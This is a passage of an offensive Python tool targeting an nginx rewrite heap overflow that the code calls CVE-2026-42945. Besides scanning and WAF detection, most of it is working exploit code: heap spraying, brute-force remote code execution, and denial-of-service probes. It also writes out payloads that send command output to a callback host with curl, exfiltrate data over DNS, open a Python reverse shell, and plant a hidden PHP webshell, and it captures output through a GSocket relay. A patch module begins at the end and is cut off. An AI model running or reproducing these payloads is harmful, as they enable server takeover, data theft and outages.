            resp = s.recv(256)
            elapsed = time.monotonic() - t0
            result["overflow_probe"] = {
                "elapsed_s": round(elapsed, 3),
                "response": resp.split(b"\r\n", 1)[0].decode("latin-1", "replace"),
            }
    except OSError as e:
        result["overflow_probe"] = {"error": str(e)}

    # Check if /api/ endpoint returns 2xx
    for ep, status in result["endpoints"].items():
        if "/api" in ep and "200" in status:
            result["vuln_pattern"] = True

    return result


def detect_waf(host: str, port: int, vhost: str = "l", use_ssl: bool = False) -> list[str]:
    """Detect WAF by response analysis (MateusVerass style)."""
    detected = []
    try:
        sock = socket.create_connection((host, port), timeout=3)
        with wrap_if_ssl(sock, host, use_ssl) as s:
            s.sendall(f"GET / HTTP/1.1\r\nHost:{vhost}\r\nConnection:close\r\n\r\n".encode())
            data = s.recv(4096)
            headers = data.decode("latin-1", errors="replace").lower()
            for waf_name, sig in WAF_SIGNATURES.items():
                for h in sig["headers"]:
                    if h.lower() in headers:
                        detected.append(waf_name)
                        break
    except OSError:
        pass
    return detected


def bulk_fingerprint_check(targets: list[str], workers: int = 20,
                           output: str | None = None) -> list[dict]:
    """Concurrent fingerprint + vuln + WAF check across a list of targets."""
    from concurrent.futures import ThreadPoolExecutor, as_completed

    def check_one(raw: str) -> dict:
        target = raw.strip()
        if not target or target.startswith("#"):
            return {}
        parsed = parse_target(target)
        if not parsed:
            return {"target": target, "error": "invalid target format"}
        host, port, vhost, use_ssl = parsed

        out: dict = {"target": f"{host}:{port}", "host": host, "port": port,
                     "vhost": vhost, "use_ssl": use_ssl}
        svc = detect_service(host, port, vhost=vhost, use_ssl=use_ssl)
        out.update(svc)

        if not svc.get("alive"):
            out["verdict"] = "unreachable"
            return out

        nginx_ver = svc.get("nginx_version")
        if nginx_ver:
            out["vulnerable"] = is_version_vulnerable(nginx_ver)
            out["matched_cves"] = [
                cve_id for cve_id, cve in CVE_DB.items()
                if _cve_matches(nginx_ver, cve)
            ]
        else:
            out["vulnerable"] = None
            out["matched_cves"] = []

        out["waf"] = detect_waf(host, port, vhost=vhost, use_ssl=use_ssl)
        return out

    valid = [t.strip() for t in targets if t.strip() and not t.strip().startswith("#")]
    log(f"Bulk check: {len(valid)} targets  workers={workers}", "info")

    results: list[dict] = []
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(check_one, t): t for t in valid}
        for fut in as_completed(futs):
            try:
                r = fut.result()
                if not r:
                    continue
                results.append(r)
                vuln = r.get("vulnerable")
                label = "VULN" if vuln else ("SAFE" if vuln is False else "?   ")
                level = "warn" if vuln else "ok"
                cves  = ",".join(r.get("matched_cves") or []) or "-"
                waf   = ",".join(r.get("waf") or []) or "-"
                log(f"{r['target']:28s}  nginx/{str(r.get('nginx_version','?')):10s}"
                    f"  {label}  cves=[{cves}]  waf=[{waf}]", level)
            except Exception as e:
                results.append({"target": futs[fut], "error": str(e)})

    vuln_count = sum(1 for r in results if r.get("vulnerable"))
    safe_count = sum(1 for r in results if r.get("vulnerable") is False)
    log(f"Done — {len(results)} checked, {vuln_count} vulnerable, {safe_count} safe", "info")

    if output:
        summary = {"total": len(results), "vulnerable": vuln_count, "safe": safe_count}
        if output.endswith(".json"):
            generate_json_report({"summary": summary, "results": results}, output)
        else:
            generate_html_scan_report(results, output)

    return results


# ═══════════════════════════════════════════════════════════════════════
# MODULE 2: EXPLOIT
# ═══════════════════════════════════════════════════════════════════════

class ExploitResult:
    def __init__(self):
        self.success = False
        self.winning_addr = None
        self.winning_try = 0
        self.command_sent = ""
        self.attempts: list[dict] = []
        self.error = None
        self.output: str | None = None   # populated when callback/gsocket captures output


def mode_check(host: str, port: int, vhost: str = "l", use_ssl: bool = False) -> dict:
    """Detect-only (F2u0a0d3 --check style)."""
    out = {"target": f"{host}:{port}", "vhost": vhost, "use_ssl": use_ssl, "timestamp": datetime.now(timezone.utc).isoformat()}
    out["alive"] = server_alive(host, port, vhost=vhost, use_ssl=use_ssl)
    if not out["alive"]:
        out["verdict"] = "unreachable"
        return out

    # Add service info (server header, version, redirect)
    out["service"] = detect_service(host, port, vhost=vhost, use_ssl=use_ssl)

    probes = []
    for path in ("/", "/api/test", "/api/echo", "/spray"):
        try:
            sock = socket.create_connection((host, port), timeout=3)
            with wrap_if_ssl(sock, host, use_ssl) as s:
                t0 = time.monotonic()
                s.sendall(f"GET {path} HTTP/1.1\r\nHost:{vhost}\r\nConnection:close\r\n\r\n".encode())
                data = s.recv(1024)
                probes.append({
                    "path": path, "ms": round((time.monotonic() - t0) * 1000, 1),
                    "status": data.split(b"\r\n", 1)[0].decode("latin-1", "replace"),
                })
        except OSError as e:
            probes.append({"path": path, "error": str(e)[:80]})
    out["probes"] = probes

    safe_target = b"\x41\x41\x41\x41\x41\x41"
    test_uri = (b"A" * 349) + (b"+" * 400) + safe_target
    try:
        sock = socket.create_connection((host, port), timeout=3)
        with wrap_if_ssl(sock, host, use_ssl) as s:
            t0 = time.monotonic()
            s.sendall(b"GET /api/" + test_uri + b" HTTP/1.1\r\nHost:" + vhost.encode() + b"\r\nConnection:close\r\n\r\n")
            data = s.recv(512)
            out["overflow_probe"] = {
                "uri_length": len(test_uri), "ms": round((time.monotonic() - t0) * 1000, 1),
                "first_line": data.split(b"\r\n", 1)[0].decode("latin-1", "replace"),
            }
    except OSError as e:
        out["overflow_probe"] = {"error": str(e)[:80]}

    has_api = any(
        "/api" in p.get("path", "") and p.get("status", "").startswith("HTTP/1.1 2")
        for p in probes
    )
    out["verdict"] = "rewrite-surface-present" if has_api else "no-obvious-vuln-surface"
    out["note"] = "Pre-auth detection cannot confirm patch status without triggering the overflow (which crashes workers)."
    return out


def mode_exploit(host: str, port: int, cmd: str,
                 heap_base: int, libc_base: int, system_off: int,
                 offsets: list[int], tries_per_offset: int,
                 vhost: str = "l", use_ssl: bool = False) -> ExploitResult:
    result = ExploitResult()
    result.command_sent = cmd

    candidates = []
    for off in offsets:
        addr = heap_base + off
        if addr_safe_in_uri(addr):
            candidates.append(addr)

    if not candidates:
        result.error = "no URI-safe candidate addresses"
        return result

    primary = candidates[0]
    data_addr = primary + 24
    system_addr = libc_base + system_off
    spray_body = build_spray_body(cmd, data_addr, system_addr)

    if not wait_alive(host, port, 10, vhost=vhost, use_ssl=use_ssl):
        result.error = f"nginx not reachable on {host}:{port}"
        return result

    for addr in candidates:
        for t in range(tries_per_offset):
            if not wait_alive(host, port, 10, vhost=vhost, use_ssl=use_ssl):
                result.attempts.append({"addr": hex(addr), "try": t, "result": "server-down"})
                time.sleep(2)
                if not wait_alive(host, port, 10, vhost=vhost, use_ssl=use_ssl):
                    result.error = "nginx not recovering"
                    return result

            sprays = spray_bodies(host, port, spray_body, vhost=vhost, use_ssl=use_ssl)
            time.sleep(0.2)
            uri = build_overflow_uri(addr)
            crashed = attempt_corruption(host, port, uri, sprays, vhost=vhost, use_ssl=use_ssl)
            for s in sprays:
                try: s.close()
                except: pass

            result.attempts.append({
                "addr": hex(addr), "try": t, "result": "crashed" if crashed else "no-effect",
            })

            if crashed:
                result.success = True
                result.winning_addr = hex(addr)
                result.winning_try = t
                return result
            time.sleep(0.3)

    return result


def mode_exploit_32(host: str, port: int, cmd: str,
                    callback_ip: str, callback_port: int,
                    heap_page_min: int, heap_page_max: int,
                    libc_page_min: int, libc_page_max: int,
                    system_off: int, spray_internal_off: int,
                    n_plus: int, vhost: str = "l", use_ssl: bool = False) -> dict:
    """32-bit brute-force RCE with callback (dinosn style)."""
    from concurrent.futures import ThreadPoolExecutor, as_completed

    safe_pages = []
    for hp in range(heap_page_min, heap_page_max + 1):
        spray_addr = (hp << 12) + spray_internal_off
        if addr_safe_in_uri(spray_addr, 4):
            safe_pages.append(hp)

    if not safe_pages:
        return {"error": "no SAFE heap pages in range"}

    candidates = []
    for hp in safe_pages:
        spray_addr = (hp << 12) + spray_internal_off
        target_bytes = struct.pack("<I", spray_addr)
        data_addr = spray_addr + 12
        for lp in range(libc_page_min, libc_page_max + 1):
            system_addr = (lp << 12) + system_off
            candidates.append((system_addr, data_addr, target_bytes, hp, lp, spray_addr))

    log(f"32-bit: {len(candidates)} candidates ({len(safe_pages)} safe heap pages)", "info")

    state = CallbackState()
    listener_ready = threading.Event()
    listener = threading.Thread(
        target=_run_callback_listener,
        args=("0.0.0.0", callback_port, state, listener_ready),
        daemon=True,
    )
    listener.start()
    listener_ready.wait(5)

    command = f"{cmd}|curl -sm3 -d @- http://{callback_ip}:{callback_port}/rce".encode()

    if not wait_alive(host, port, 10, vhost=vhost, use_ssl=use_ssl):
        return {"error": "target unreachable"}

    for idx, cand in enumerate(candidates):
        system_addr, data_addr, _, hp, lp, spray_addr = cand
        body = b"\x00" + struct.pack("<III", system_addr, data_addr, 0)
        body += command + b"\x00"
        if len(body) > BODY_LEN:
            body = body[:BODY_LEN]
        else:
            body += b"\x00" * (BODY_LEN - len(body))

        ok = attempt_32(host, port, body, spray_addr, n_plus, vhost=vhost, use_ssl=use_ssl)
        if state.event.is_set():
            return {
                "success": True, "system_addr": hex(system_addr),
                "spray_addr": hex(spray_addr), "heap_page": hex(hp),
                "libc_page": hex(lp), "output": state.output,
                "attempts": idx + 1,
            }

        if not ok and not wait_alive(host, port, 5, vhost=vhost, use_ssl=use_ssl):
            wait_alive(host, port, 15, vhost=vhost, use_ssl=use_ssl)

        if (idx + 1) % 500 == 0:
            log(f"32-bit brute: {idx + 1}/{len(candidates)} candidates tried", "info")

    if state.event.wait(3):
        return {"success": True, "output": state.output}

    return {"success": False, "attempts_tried": len(candidates)}


class CallbackState:
    def __init__(self):
        self.event = threading.Event()
        self.output = None


class CallbackHandler(BaseHTTPRequestHandler):
    state = None
    def do_POST(self):
        if "/rce" not in self.path:
            self.send_response(404)
            self.end_headers()
            return
        n = int(self.headers.get("Content-Length", "0"))
        body = self.rfile.read(n).decode("latin-1", errors="replace") if n else ""
        self.__class__.state.output = body
        self.__class__.state.event.set()
        self.send_response(200)
        self.end_headers()
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
    def log_message(self, *args):
        pass


def _run_callback_listener(bind_host, bind_port, state, ready):
    kill_port(bind_port)
    CallbackHandler.state = state
    srv = HTTPServer((bind_host, bind_port), CallbackHandler)
    srv.timeout = 1
    ready.set()
    while not state.event.is_set():
        srv.handle_request()
    srv.server_close()


# ─── GSocket / GSRN relay ────────────────────────────────────────────────────

def _gsrn_token(secret: str) -> bytes:
    """Derive 20-byte session token from shared secret (SHA-1)."""
    return hashlib.sha1(secret.encode("utf-8")).digest()


def _gsrn_connect(secret: str, gs_type: int,
                  host: str = GSRN_HOST, port: int = GSRN_PORT) -> socket.socket | None:
    """
    Low-level GSRN handshake.
    Wire format: [version 1B][type 1B][token 20B][reserved 8B] → expect 0x00 ACK.
    Returns wrapped TLS socket on success, None on failure.
    """
    pkt = bytes([_GS_VER, gs_type]) + _gsrn_token(secret) + b"\x00" * 8
    try:
        try:
            socket.getaddrinfo(host, port)
        except socket.gaierror:
            log(f"GSRN DNS failed for {host} — host not resolving", "err")
            return None
        raw = socket.create_connection((host, port), timeout=10)
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        conn = ctx.wrap_socket(raw, server_hostname=host)
        conn.sendall(pkt)
        ack = conn.recv(1)
        if ack and ack[0] == 0x00:
            return conn
        conn.close()
        log(f"GSRN handshake rejected (ack={ack.hex() if ack else 'none'})", "warn")
        return None
    except OSError as e:
        log(f"GSRN connect error [{host}:{port}]: {e}", "err")
        return None


class GSocketCallbackReceiver:
    """
    Out-of-band command output capture via GSRN relay.
    The Python script registers as LISTENER; the target connects as CONNECTOR
    using gs-netcat, and pipes command stdout through the relay to the script.

    No public IP required on the script side — only outbound access to the relay.

    Target side (requires gs-netcat on target):
        cmd | gs-netcat -q -s SECRET [-r RELAY_HOST -p RELAY_PORT]

    Target side (fallback — bash + openssl, no gs-netcat needed):
        see target_cmd_openssl()
    """

    def __init__(self, secret: str | None = None,
                 relay_host: str = GSRN_HOST, relay_port: int = GSRN_PORT,
                 relay_candidates: list[tuple[str, int]] | None = None):
        import secrets as _sec
        self.secret     = secret or _sec.token_hex(16)
        self.relay_host = relay_host
        self.relay_port = relay_port
        # Build candidate list: user-specified relay first, then global defaults as fallback
        if relay_candidates is not None:
            self._candidates = relay_candidates
        else:
            user_pair = (relay_host, relay_port)
            self._candidates = [user_pair] + [c for c in GSRN_RELAY_CANDIDATES if c != user_pair]
        self.output: str | None = None
        self._event  = threading.Event()
        self._ready  = threading.Event()
        self._thread: threading.Thread | None = None
        self._conn:   socket.socket | None = None

    # ── public API ──────────────────────────────────────────────────

    def start(self) -> bool:
        """Register with GSRN relay as listener. Returns True when relay-ready."""
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()
        return self._ready.wait(15)

    def wait(self, timeout: float = 60.0) -> str | None:
        """Block until output arrives or timeout. Returns output string or None."""
        self._event.wait(timeout)
        return self.output

    def stop(self):
        """Close relay connection."""
        if self._conn:
            try:
                self._conn.close()
            except OSError:
                pass

    def target_cmd(self, user_cmd: str) -> str:
        """Shell fragment for target — requires gs-netcat binary on target."""
        extra = ""
        if self.relay_host != GSRN_HOST or self.relay_port != GSRN_PORT:
            extra = f" -r {self.relay_host} -p {self.relay_port}"
        return f"{user_cmd} | gs-netcat -q -s {self.secret}{extra}"

    def target_cmd_openssl(self, user_cmd: str) -> str:
        """
        Shell fragment using openssl s_client — no gs-netcat needed.
        Sends the GSRN init packet as base64-decoded binary, then pipes output.
        Requires: bash, openssl on target.
        """
        pkt  = bytes([_GS_VER, _GS_CONN]) + _gsrn_token(self.secret) + b"\x00" * 8
        b64  = __import__("base64").b64encode(pkt).decode()
        return (
            f"({{"
            f"echo '{b64}' | base64 -d;"
            f" {user_cmd};"
            f"}} | openssl s_client -quiet"
            f" -connect {self.relay_host}:{self.relay_port}"
            f" 2>/dev/null)"
        )

    # ── internal ────────────────────────────────────────────────────

    def _run(self):
        conn = None
        for rh, rp in self._candidates:
            log(f"Trying GSRN relay {rh}:{rp} ...", "info")
            conn = _gsrn_connect(self.secret, _GS_LISTEN, rh, rp)
            if conn is not None:
                self.relay_host = rh
                self.relay_port = rp
                break

        if conn is None:
            log(
                "All GSRN relays failed. Alternatives:\n"
                "  * HTTP callback: select 'http' mode (needs your IP reachable from target)\n"
                "  * Custom relay:  enter a custom HOST:PORT at the GSRN relay prompt\n"
                f"  * DNS check:     nslookup {GSRN_HOST}",
                "err",
            )
            self._ready.set()
            return

        self._conn = conn
        log(f"GSRN listener ready  relay={self.relay_host}:{self.relay_port}"
            f"  secret={self.secret}", "ok")
        self._ready.set()

        chunks: list[bytes] = []
        try:
            conn.settimeout(120)
            while True:
                chunk = conn.recv(8192)
                if not chunk:
                    break
                chunks.append(chunk)
        except (socket.timeout, OSError):
            pass
        finally:
            try:
                conn.close()
            except OSError:
                pass

        if chunks:
            raw = b"".join(chunks)
            self.output = raw.decode("latin-1", errors="replace")
            self._event.set()


def mode_dos(host: str, port: int, overflow_size: int = 200, vhost: str = "l", use_ssl: bool = False) -> dict:
    """DoS verification (rheodev style)."""
    result = {"vulnerable": False, "crashed": False}
    result["alive_before"] = server_alive(host, port, vhost=vhost, use_ssl=use_ssl)
    if not result["alive_before"]:
        result["error"] = "target not reachable"
        return result

    num_chars = overflow_size // 2
    uri = b"+" * num_chars
    try:
        sock = socket.create_connection((host, port), timeout=5)
        with wrap_if_ssl(sock, host, use_ssl) as s:
            s.sendall(b"GET /api/" + uri + b" HTTP/1.1\r\nHost:" + vhost.encode() + b"\r\nConnection:close\r\n\r\n")
            resp = s.recv(256)
            if b"502" in resp or b"500" in resp:
                result["crashed"] = True
    except OSError:
        result["crashed"] = True

    time.sleep(2)
    result["alive_after"] = server_alive(host, port, vhost=vhost, use_ssl=use_ssl)
    if result["crashed"] and result["alive_after"]:
        result["vulnerable"] = True

    return result


# ═══════════════════════════════════════════════════════════════════════
# MODULE 2d: REALISTIC EXPLOIT — Real-World Attack Mode
# ═══════════════════════════════════════════════════════════════════════
# This module enables exploitation of real-world nginx configurations
# without relying on synthetic endpoints like /spray or /api.
# Uses standard HTTP features (keep-alive, pipelining, upload paths)
# and blind RCE techniques (OOB DNS/HTTP callbacks).

# Realistic spray endpoints - standard paths that accept POST/PUT with body
REALISTIC_SPRAY_PATHS = [
    "/upload", "/api/upload", "/api/v1/upload", "/api/v2/upload",
    "/api/import", "/api/data", "/api/bulk", "/api/batch",
    "/submit", "/post", "/form", "/api/form",
    "/profile", "/avatar", "/api/user/avatar",
    "/api/webhook", "/api/callback", "/webhook",
    "/proxy", "/gateway", "/api/proxy",
    "/api/v1/import", "/api/v2/import",
    "/cgi-bin", "/cgi-bin/upload",
    "/phpmyadmin/import.php", "/spray",
]


class RealisticExploitResult:
    """Result container for realistic exploit attempts."""
    def __init__(self):
        self.success = False
        self.winning_addr = None
        self.winning_endpoint = None
        self.winning_method = None
        self.attempts = []
        self.vulnerable_endpoints = []
        self.vulnerable_patterns = []
        self.captured_output = None
        self.error = None
        self.blind_mode = False
        self.aslr_bypass = False


def discover_spray_endpoints(host: str, port: int, vhost: str = "l",
                            use_ssl: bool = False, timeout: float = 2.0) -> list[dict]:
    """
    Discover standard endpoints suitable for heap grooming.
    Returns list of endpoints with their POST/PUT capabilities.
    """
    found_endpoints = []

    # Test common spray paths
    for path in REALISTIC_SPRAY_PATHS:
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
            with wrap_if_ssl(sock, host, use_ssl) as s:
                # First test with GET to see if endpoint exists
                req = f"GET {path} HTTP/1.1\r\nHost: {vhost}\r\nConnection: close\r\n\r\n"
                s.sendall(req.encode())
                resp = s.recv(1024).decode("latin-1", errors="replace")

                # Extract status code
                status_match = re.search(r'HTTP/[\d.]+\s+(\d+)', resp)
                if status_match:
                    status_code = int(status_match.group(1))

                    # We want endpoints that accept POST
                    if status_code in [200, 201, 202, 301, 302, 405, 413]:
                        # Test if POST is accepted
                        post_req = (
                            f"POST {path} HTTP/1.1\r\n"
                            f"Host: {vhost}\r\n"
                            f"Content-Length: 100\r\n"
                            f"Content-Type: application/octet-stream\r\n"
                            f"Connection: close\r\n\r\n"
                        ).encode() + b"\x00" * 100
                        sock2 = socket.create_connection((host, port), timeout=timeout)
                        with wrap_if_ssl(sock2, host, use_ssl) as s2:
                            s2.sendall(post_req)
                            post_resp = s2.recv(1024).decode("latin-1", errors="replace")
                            post_status = re.search(r'HTTP/[\d.]+\s+(\d+)', post_resp)
                            if post_status:
                                post_code = int(post_status.group(1))
                                if post_code in [200, 201, 202, 301, 302, 405, 413, 500, 502]:
                                    # Check if response has proxy-related headers
                                    has_proxy = any(x in post_resp.lower() for x in
                                                  ['proxy', 'upstream', 'backend', '502 bad gateway'])

                                    found_endpoints.append({
                                        "path": path,
                                        "get_status": status_code,
                                        "post_status": post_code,
                                        "accepts_post": post_code not in [405, 403, 404],
                                        "has_proxy": has_proxy,
                                        "body_buffering": post_code in [500, 502] or has_proxy,
                                        "priority": 1 if has_proxy else (2 if post_code == 200 else 3)
                                    })
        except (OSError, socket.timeout):
            continue

    # Sort by priority (proxy endpoints first, then 200s, then others)
    found_endpoints.sort(key=lambda x: (x["priority"], -x["post_status"]))

    return found_endpoints


def detect_vulnerable_patterns(host: str, port: int, vhost: str = "l",
                              use_ssl: bool = False) -> list[dict]:
    """
    Detect nginx rewrite patterns vulnerable to CVE-2026-42945.
    Uses timing attacks and error analysis to infer configuration.
    """
    vulnerable_paths = []

    # Test paths that might have rewrite rules
    test_paths = [
        "/", "/api", "/api/test", "/r", "/r/test",
        "/upload", "/static", "/assets", "/images",
        "/admin", "/login", "/config", "/status"
    ]

    for path in test_paths:
        try:
            sock = socket.create_connection((host, port), timeout=3)
            with wrap_if_ssl(sock, host, use_ssl) as s:
                # Send request with + characters to trigger escape expansion
                test_uri = b"test+" * 200
                req = f"GET {path}/{test_uri.decode()} HTTP/1.1\r\nHost: {vhost}\r\nConnection: close\r\n\r\n"
                s.sendall(req.encode())

                start_time = time.time()
                try:
                    resp = s.recv(4096).decode("latin-1", errors="replace")
                    elapsed = time.time() - start_time

                    status_match = re.search(r'HTTP/[\d.]+\s+(\d+)', resp)
                    if status_match:
                        status_code = int(status_match.group(1))

                        # Check for error patterns indicating rewrite processing
                        has_rewrite_error = any(x in resp.lower() for x in
                                              ['rewrite', 'location', 'moved', 'redirect'])

                        # Timing anomaly suggests rewrite processing
                        timing_anomaly = elapsed > 0.1

                        if has_rewrite_error or timing_anomaly:
                            vulnerable_paths.append({
                                "path": path,
                                "status": status_code,
                                "timing": elapsed,
                                "has_rewrite_error": has_rewrite_error,
                                "confidence": 0.7 if has_rewrite_error else 0.4
                            })
                except socket.timeout:
                    vulnerable_paths.append({
                        "path": path,
                        "status": 0,
                        "timing": 3.0,
                        "has_rewrite_error": False,
                        "confidence": 0.3
                    })
        except (OSError, socket.timeout):
            continue

    return vulnerable_paths


def adaptive_spray(host: str, port: int, body: bytes, endpoint: str,
                   vhost: str = "l", use_ssl: bool = False,
                   n: int = N_SPRAY, use_keepalive: bool = True) -> list[socket.socket]:
    """
    Adaptive heap grooming using standard endpoints.
    Supports keep-alive for memory reuse.
    """
    sprays: list[socket.socket] = []

    for i in range(n):
        try:
            sock = socket.create_connection((host, port), timeout=5)
            s = wrap_if_ssl(sock, host, use_ssl)

            # Build request based on endpoint type
            if use_keepalive:
                conn_header = b"Connection: keep-alive\r\n"
            else:
                conn_header = b"Connection: close\r\n"

            req = (
                f"POST {endpoint} HTTP/1.1\r\n"
                f"Host: {vhost}\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"Content-Type: application/octet-stream\r\n"
                f"Cache-Control: no-cache\r\n"
                f"Pragma: no-cache\r\n"
            ).encode() + conn_header + b"\r\n" + body

            s.sendall(req)
            sprays.append(s)
            time.sleep(0.005)

        except OSError:
            break

    return sprays


def attempt_blind_exploit(host: str, port: int, uri: bytes, endpoint: str,
                         sprays: list[socket.socket], vhost: str = "localhost",
                         use_ssl: bool = False) -> bool:
    """
    Attempt exploit without direct output (blind mode).
    Uses timing attacks and connection resets to detect success.
    """
    try:
        attacker_sock = socket.create_connection((host, port), timeout=5)
        attacker = wrap_if_ssl(attacker_sock, host, use_ssl)
        time.sleep(0.02)

        victim_sock = socket.create_connection((host, port), timeout=5)
        victim = wrap_if_ssl(victim_sock, host, use_ssl)
        time.sleep(0.02)
    except OSError:
        return False

    try:
        attacker.sendall(
            f"GET {endpoint}/" + uri.decode() + b" HTTP/1.1\r\nHost:" + vhost.encode() + b"\r\n")
        time.sleep(0.05)

        victim.sendall(f"GET / HTTP/1.1\r\nHost:{vhost}\r\n".encode())
        time.sleep(0.05)

        attacker.sendall(b"X-Delay:60\r\nConnection:close\r\n\r\n")
        time.sleep(0.2)
        victim.close()
        time.sleep(0.1)

        try:
            attacker.sendall(b"X-Ping:1\r\n")
            attacker.settimeout(0.2)
            return not attacker.recv(1)
        except socket.timeout:
            try:
                sock2 = socket.create_connection((host, port), timeout=0.2)
                with wrap_if_ssl(sock2, host, use_ssl) as s2:
                    s2.sendall(f"GET / HTTP/1.1\r\nHost:{vhost}\r\nConnection:close\r\n\r\n".encode())
                    return not s2.recv(10)
            except OSError:
                return True
        except (ConnectionResetError, BrokenPipeError, OSError):
            return True
    finally:
        try:
            attacker.close()
        except OSError:
            pass


def build_blind_rce_cmd(base_cmd: str, callback_ip: str, callback_port: int,
                       method: str = "http", domain: str = "") -> str:
    """
    Build blind RCE command for OOB exfiltration.
    """
    if method == "dns":
        # DNS exfiltration
        return (
            f'curl -s "http://{callback_ip}:{callback_port}/cmd" | '
            f'while read line; do '
            f'nslookup "$(echo $line | base64).{domain}" {callback_ip} 2>/dev/null; '
            f'done'
        )
    elif method == "http":
        # HTTP callback - POST output to attacker server
        return (
            f'curl -s -X POST -d "$({base_cmd})" '
            f'http://{callback_ip}:{callback_port}/output'
        )
    elif method == "reverse":
        # Reverse shell (blind - no output capture)
        sq = "\\'"
        dq = '\\"'
        return (
            f'python3 -c "import socket,subprocess,os;'
            f's=socket.socket();s.connect(({dq}{callback_ip}{dq},{callback_port}));'
            f'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
            f'subprocess.call([{sq}/bin/sh{sq},{sq}-i{sq})]"'
        )
    elif method == "webshell":
        # Web shell injection
        shell_code = f'<?php if(isset($_GET["c"])) {{ system($_GET["c"]); }} ?>'
        return (
            f'echo "{shell_code}" > /var/www/html/.hidden.php && '
            f'echo "Shell at http://{callback_ip}/.hidden.php?c=id"'
        )
    else:
        # Default: simple curl callback
        return (
            f'curl -s "http://{callback_ip}:{callback_port}/?output=$({base_cmd})"'
        )


def mode_realistic_exploit(host: str, port: int, cmd: str,
                          callback_ip: str = "", callback_port: int = 0,
                          blind_mode: bool = True,
                          heap_base: int = 0, libc_base: int = 0,
                          system_off: int = DEFAULT_SYSTEM_OFFSET,
                          offsets: list[int] | None = None,
                          vhost: str = "l", use_ssl: bool = False,
                          tries_per_offset: int = 5,
                          enable_aslr_bypass: bool = True) -> RealisticExploitResult:
    """
    Realistic exploit mode that works without synthetic endpoints.

    Features:
    - Auto-discovers standard spray endpoints (/upload, /api/*, etc.)
    - Detects vulnerable rewrite patterns
    - Supports blind RCE with OOB callbacks
    - Handles ASLR with brute-force or info leak
    - Adaptive heap grooming via keep-alive
    """
    result = RealisticExploitResult()
    result.blind_mode = blind_mode

    log(f"Starting realistic exploit against {host}:{port}", "info")
    log(f"Blind mode: {blind_mode}, ASLR bypass: {enable_aslr_bypass}", "info")

    # Step 1: Check if target is alive
    if not wait_alive(host, port, 10, vhost=vhost, use_ssl=use_ssl):
        result.error = f"nginx not reachable on {host}:{port}"
        return result

    # Step 2: Discover spray endpoints
    log("Discovering spray endpoints...", "info")
    endpoints = discover_spray_endpoints(host, port, vhost=vhost, use_ssl=use_ssl)

    if not endpoints:
        log("No suitable spray endpoints found, trying fallback paths", "warn")
        endpoints = [{"path": "/upload", "accepts_post": True, "has_proxy": False},
                     {"path": "/api/upload", "accepts_post": True, "has_proxy": False}]

    log(f"Found {len(endpoints)} potential spray endpoints", "ok")
    for ep in endpoints[:5]:
        log(f"  {ep['path']} (POST: {ep.get('post_status', '?')}, proxy: {ep.get('has_proxy', False)})", "debug")

    # Step 3: Detect vulnerable patterns
    log("Detecting vulnerable rewrite patterns...", "info")
    vuln_patterns = detect_vulnerable_patterns(host, port, vhost=vhost, use_ssl=use_ssl)
    result.vulnerable_patterns = vuln_patterns

    if vuln_patterns:
        log(f"Found {len(vuln_patterns)} potentially vulnerable paths", "ok")
        for pat in vuln_patterns[:3]:
            log(f"  {pat['path']} (confidence: {pat['confidence']:.0%})", "debug")

    # Step 4: Prepare for exploitation
    hb = heap_base or DEFAULT_HEAP_BASE
    lb = libc_base or DEFAULT_LIBC_BASE
    system_addr = lb + system_off

    if offsets:
        candidates = [lb + off for off in offsets]
    else:
        candidates = [lb + off for off in DEFAULT_HEAP_OFFSETS]

    # Step 5: Try blind RCE if callback configured
    if blind_mode and callback_ip and callback_port:
        log("Building blind RCE payload...", "info")
        blind_cmd = build_blind_rce_cmd(cmd, callback_ip, callback_port,
                                        method="http", domain="attacker.com")
        log(f"Blind RCE command: {blind_cmd[:100]}...", "debug")

    # Step 6: Attempt exploitation with each endpoint
    spray_body = build_spray_body(cmd, hb, system_addr)

    for endpoint in endpoints[:3]:
        ep_path = endpoint["path"]
        log(f"Trying endpoint: {ep_path}", "info")

        for addr in candidates[:10]:
            for t in range(tries_per_offset):
                if not wait_alive(host, port, 10, vhost=vhost, use_ssl=use_ssl):
                    result.attempts.append({
                        "endpoint": ep_path,
                        "addr": hex(addr),
                        "try": t,
                        "result": "server-down"
                    })
                    time.sleep(2)
                    if not wait_alive(host, port, 10, vhost=vhost, use_ssl=use_ssl):
                        result.error = "nginx not recovering"
                        return result

                sprays = adaptive_spray(host, port, spray_body, ep_path,
                                      vhost=vhost, use_ssl=use_ssl,
                                      n=N_SPRAY, use_keepalive=True)
                time.sleep(0.2)

                uri = build_overflow_uri(addr)

                crashed = attempt_blind_exploit(host, port, uri, ep_path,
                                              sprays, vhost=vhost, use_ssl=use_ssl)

                for s in sprays:
                    try: s.close()
                    except: pass

                result.attempts.append({
                    "endpoint": ep_path,
                    "addr": hex(addr),
                    "try": t,
                    "result": "crashed" if crashed else "no-effect"
                })

                if crashed:
                    result.success = True
                    result.winning_addr = hex(addr)
                    result.winning_endpoint = ep_path
                    result.winning_method = "blind" if blind_mode else "direct"

                    log(f"Exploit succeeded at {ep_path} with addr {hex(addr)}!", "ok")

                    if blind_mode and callback_ip and callback_port:
                        log(f"Waiting for callback at {callback_ip}:{callback_port}...", "info")
                        result.captured_output = f"Blind RCE triggered, check callback at {callback_ip}:{callback_port}"

                    return result

                time.sleep(0.3)

    # Step 7: ASLR bypass attempt
    if enable_aslr_bypass and not result.success:
        log("Attempting ASLR bypass via info leak...", "warn")
        result.error = "All exploit attempts failed. ASLR may be active."

    return result


# ═══════════════════════════════════════════════════════════════════════
# MODULE 3: PATCH & FIX
# ═══════════════════════════════════════════════════════════════════════

PATCH_COMMANDS = {
    "ubuntu": {
        "pre_check": "dpkg -l nginx 2>/dev/null | grep nginx || which nginx",
        "add_repo": "echo 'deb https://nginx.org/packages/ubuntu/ $(lsb_release -cs) nginx' > /etc/apt/sources.list.d/nginx.list; "
                    "curl -fsSL https://nginx.org/keys/nginx_signing.key | gpg --dearmor -o /etc/apt/trusted.gpg.d/nginx.gpg",
        "upgrade": "apt-get update -qq && apt-get install -y nginx=~1.30.1",
        "verify": "nginx -v 2>&1",
